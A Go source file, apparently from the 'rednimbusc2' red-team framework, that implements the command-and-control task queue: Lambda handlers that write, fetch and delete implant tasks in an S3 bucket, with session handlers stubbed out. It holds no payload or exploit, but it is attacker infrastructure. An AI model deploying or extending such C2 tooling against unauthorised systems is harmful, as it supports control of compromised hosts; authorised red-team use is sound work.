// package lambdac2 handels all C2-related
// requests, such as setting and getting tasks
package lambdac2

import (
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"

	"github.com/bluesentinelsec/rednimbusc2/pkg/awsProfileHandler"
	"github.com/bluesentinelsec/rednimbusc2/pkg/s3wrapper"
	"github.com/bluesentinelsec/rednimbusc2/pkg/tasker"
	log "github.com/sirupsen/logrus"
)

var tasksKey string = "tasks/"
var tmp string = "/tmp/"

func RouteTaskToHandler(taskObj *tasker.TaskObject) (any, error) {

	log.Debug("RouteTaskToHandler")

	switch taskObj.LambdaHandler {

	case "HandleSetLambdaTask":
		returnObject, err := HandleSetLambdaTask(taskObj)
		return returnObject, err

	case "HandleGetLambdaTask":
		returnObject, err := HandleGetLambdaTask(taskObj)
		return returnObject, err

	case "HandleRemoveLambdaTask":
		returnObject, err := HandleRemoveLambdaTask(taskObj)
		return returnObject, err

	case "HandleGetSession":
		s := "sorry, this feature is not implemented at this time"
		return s, nil

	case "HandleListSessions":
		s := "sorry, this feature is not implemented at this time"
		return s, nil

	case "HandleRemoveSession":
		s := "sorry, this feature is not implemented at this time"
		return s, nil

		// ToDo: add routes access by target implant

	default:
		e := fmt.Sprintf("received invalid Lambda handler in task object: %v\n", taskObj.GetLambdaHandler())
		return nil, errors.New(e)
	}
}

// HandleSetLambdaTask writes the provided task object
// to s3://nimbusc2/tasks/{taskID}
func HandleSetLambdaTask(taskObj *tasker.TaskObject) (any, error) {

	log.Info("setting new task")

	// returnObj is returned to the nimbusC2 client
	type returnObj struct {
		Response string `json:"response"`
		TaskID   string `json:"taskID"`
	}

	retObj := returnObj{
		Response: "call to set-task failed",
	}

	// ToDo: if session is provided, validate that session exists

	log.Debug("converting task to JSON")
	taskJSON, err := json.Marshal(taskObj)
	if err != nil {
		return retObj, err
	}

	taskFile := tmp + taskObj.TaskID
	log.Debug("writing task file to disk as: ", taskFile)
	err = ioutil.WriteFile(taskFile, taskJSON, 0600)
	if err != nil {
		return retObj, err
	}

	key := tasksKey + taskObj.TaskID
	bucketName, err := awsProfileHandler.GetNimbusBucketName()
	if err != nil {
		return retObj, err
	}
	log.Debugf("writing task to s3://%v/%v", bucketName, key)
	err = s3wrapper.PutFile(taskFile, bucketName, key)
	if err != nil {
		return retObj, err
	}

	// display succes message to AWS console
	success := fmt.Sprintf("successfully set task %v", taskObj.TaskID)
	log.Info(success)

	// return success message to nimbusC2 client
	retObj.Response = "successfully set task"
	retObj.TaskID = taskObj.TaskID
	return retObj, err
}

func HandleGetLambdaTask(taskObj *tasker.TaskObject) (any, error) {

	log.Info("getting task: ", taskObj.TaskID)

	key := tasksKey + taskObj.TaskID
	log.Debug("set S3 key: ", key)

	outFile := tmp + taskObj.TaskID
	log.Debug("set out file: ", outFile)

	bucketName, err := awsProfileHandler.GetNimbusBucketName()
	log.Debug("got S3 bucket name: ", bucketName)
	if err != nil {
		return nil, err
	}
	log.Debugf("downloading file s3://%v/%v", bucketName, key)
	err = s3wrapper.GetFile(bucketName, key, outFile)
	if err != nil {
		return nil, err
	}

	log.Debug("reading task file: ", outFile)
	taskJson, err := ioutil.ReadFile(outFile)
	if err != nil {
		return nil, err
	}

	// delete this later
	log.Debug(string(taskJson))
	log.Info("successfully obtained task: ", taskObj.TaskID)

	return taskJson, err
}

func HandleRemoveLambdaTask(taskObj *tasker.TaskObject) (any, error) {

	log.Info("deleting task: ", taskObj.TaskID)

	// returnObj is returned to the nimbusC2 client
	type returnObj struct {
		Response string `json:"response"`
		TaskID   string `json:"taskID"`
	}

	retObj := returnObj{
		Response: "call to remove-task failed",
	}

	bucketName, err := awsProfileHandler.GetNimbusBucketName()
	if err != nil {
		return retObj, err
	}
	key := tasksKey + taskObj.TaskID
	err = s3wrapper.RemoveFile(bucketName, key)
	if err != nil {
		return retObj, err
	}

	s := fmt.Sprintf("successfully deleted task: %v", taskObj.TaskID)
	log.Info(s)

	retObj.Response = "successfully deleted task"
	retObj.TaskID = taskObj.TaskID

	return retObj, nil
}
